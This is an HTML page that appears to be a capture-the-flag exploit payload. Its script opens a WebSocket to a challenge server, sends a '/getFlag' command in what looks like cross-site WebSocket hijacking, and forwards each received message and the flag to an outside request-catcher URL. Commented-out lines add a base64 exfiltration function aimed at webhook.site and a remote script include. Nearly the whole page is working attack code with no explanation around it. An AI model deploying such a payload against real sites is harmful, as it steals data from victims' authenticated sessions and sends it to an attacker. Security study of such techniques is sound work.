<html>

<head>
  <title>Document</title>
  <!-- <script src="https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd/test.js"></script> -->
</head>

<body>

  <script>

    // fetch('http://server.dottak.me')
    // fetch('https://kyppjti.request.dreamhack.games')

    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
    // ws.onopen = function () {
    //   setTimeout(() => {
    //     ws.send(JSON.stringify({ message: '/getFlag' }));
    //   }, 1000);
    // };
    ws.onopen = function () {
      console.log('WebSocket connection established');
      // Request the flag
      ws.send(JSON.stringify({
        message: '/getFlag'
      }));
    };

    ws.onmessage = function (event) {
      const data = JSON.parse(event.data);
      fetch('https://kyppjti.request.dreamhack.games/log?data=' + data.message)

      if (data.message.includes('Flag:')) {
        const flag = data.message;
        fetch('https://kyppjti.request.dreamhack.games/flag?data=' + flag)
      }
    };

    ws.onerror = function (error) {
      fetch('https://kyppjti.request.dreamhack.games/error?error=' + error)
    };

    ws.onclose = function () {
      fetch('https://kyppjti.request.dreamhack.games/close')
    };

    // ws.addEventListener('open', () => {
    //   ws.send(JSON.stringify({ message: '/getFlag' }));
    // });

    // /* ---------- 2. 플래그 수신 → 외부 서버로 전송 ---------- */
    // function exfil(tag, data) {
    //   const payload = encodeURIComponent(btoa(data));      // base64 → URL-safe
    //   fetch(`https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd/?${tag}=${payload}`).catch(() => { });
    // }
    // ws.addEventListener('message', ev => exfil('flag', encodeURIComponent(ev.data)));
    // ws.addEventListener('error', ev => exfil('error', encodeURIComponent(ev.message) || 'ws_error'));
  </script>
</body>

</html>